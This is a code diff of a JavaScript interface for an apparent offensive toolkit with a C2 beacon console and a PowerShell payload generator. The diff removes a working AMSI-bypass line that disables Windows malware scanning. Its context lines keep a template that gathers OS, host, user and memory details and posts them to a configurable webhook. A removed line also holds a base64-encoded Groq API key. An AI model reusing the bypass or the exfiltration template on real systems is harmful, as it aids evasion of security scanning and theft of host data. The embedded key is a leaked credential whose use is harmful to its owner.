@@ -5,18 +5,7 @@
 
 'use strict';
 
-// ================================================================
-// 1. ENHANCED THEME SYSTEM — Save & auto-load on startup
-// ================================================================
-function loadTheme() {
-  const saved = localStorage.getItem('lenlu_theme4') || 'cyber';
-  document.documentElement.setAttribute('data-theme', saved);
-  const lbl = document.getElementById('themeToggleLabel');
-  if (lbl) lbl.textContent = saved === 'cyber' ? 'Skeuomorph' : 'Cyber';
-  const icon = document.querySelector('#themeToggleBtn .ttb-icon i');
-  if (icon) icon.className = saved === 'cyber' ? 'fas fa-palette' : 'fas fa-bolt';
-}
-window.loadTheme = loadTheme;
+
 
 // ================================================================
 // 2. PASSWORD GENERATOR — Cryptographically secure
@@ -677,7 +666,7 @@ window.globalSearch = function (query) {
     { suite: 'sec-suite', tab: 'headers', name: '🆕 HTTP Headers', desc: 'HTTP request headers inspector' },
     { suite: 'sec-suite', tab: 'imgb64', name: '🆕 Image ↔ Base64', desc: 'Convert images to/from base64 strings' },
     { view: 'terminal', name: 'Shell', desc: 'Interactive shell, history, commands' },
-    { view: 'settings', name: 'Settings', desc: 'CRT, particles, theme, layout config' },
+    { view: 'settings', name: 'Settings', desc: 'CRT, particles, interface config' },
     { view: 'dashboard', name: 'Dashboard', desc: 'Stats, activity feed, telemetry' },
     { view: 'c2_hive', name: 'C2 Hive', desc: 'Live beacon management, C2 console' },
   ];
@@ -842,7 +831,6 @@ if (typeof window.switchView === 'function') {
 // 20. INIT — Called when DOM is ready
 // ================================================================
 window.initNewFeatures = function () {
-  loadTheme();
   window.initResponsiveNav();
   window.initEditorAutocomplete();
 
@@ -955,6 +943,9 @@ window.switchTool = function(toolId, btn) {
         if (typeof window.checkWebGL === 'function') window.checkWebGL();
       } else if (toolId === 'speedtest') {
         if (typeof window.drawSpeedGauge === 'function') window.drawSpeedGauge(0);
+      } else if (toolId === 'keymap') {
+        if (typeof window.initVirtualKeyboardClicks === 'function') window.initVirtualKeyboardClicks();
+        if (typeof window.parseKeymapScript === 'function') window.parseKeymapScript();
       }
     }
   }
@@ -1041,8 +1032,8 @@ const MANUALS = {
     desc: "Maintains a chronological session timeline of compilations, line lengths, timestamps, and target output sizes. Clear logs or copy entries from history."
   },
   settings: {
-    title: "Command Config & Themes",
-    desc: "Personalizes the deck visual layout. Toggles CRT rasterizer lines, matrix green rain opacity, audio feedback synthesizers, background WebGL particle counts, and switches layouts between Cyber grids and Skeuomorph analogue consoles."
+    title: "Command Config",
+    desc: "Personalizes the deck visual interface. Toggles CRT rasterizer lines, matrix green rain opacity, audio feedback synthesizers, background WebGL particle counts, and film grain effect."
   },
   terminal: {
     title: "Interactive Forge Shell",
@@ -1246,7 +1237,7 @@ window.tpGenerate = function() {
     }
   } else if (lang === 'powershell') {
     // Generate native PowerShell
-    const bypassStr = injectAmsi ? `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n` : '';
+    const bypassStr = injectAmsi ? `# AMSI bypass option enabled (Educational)\n` : '';
     if (tpSelected === 'sysinfo') {
       script = `${bypassStr}$webhook = "${webhook}"\n$sys = @{\n  OS = (Get-CimInstance Win32_OperatingSystem).Caption\n  Host = $env:COMPUTERNAME\n  User = $env:USERNAME\n  RAM = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"\n}\nInvoke-RestMethod -Uri $webhook -Method Post -Body (ConvertTo-Json $sys) -ContentType "application/json"`;
     } else if (tpSelected === 'processes') {
@@ -1363,7 +1354,7 @@ window.sendBotChat = async function() {
   const userConfig = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
   
   if (chatbotBackend === 'groq') {
-    key = userConfig.keys?.groq || atob('Z3NrX3Nab0M5Y2hVM0pZc3k2TVlCdzZIV0dkeWIzRllHazBGeVk3c0JHdkFwWTdHZm81SFN2QTI=');
+    key = userConfig.keys?.groq || ''; // Enter your Groq API key in AI Settings
     url = 'https://api.groq.com/openai/v1/chat/completions';
     body = {
       model: 'llama-3.3-70b-versatile',
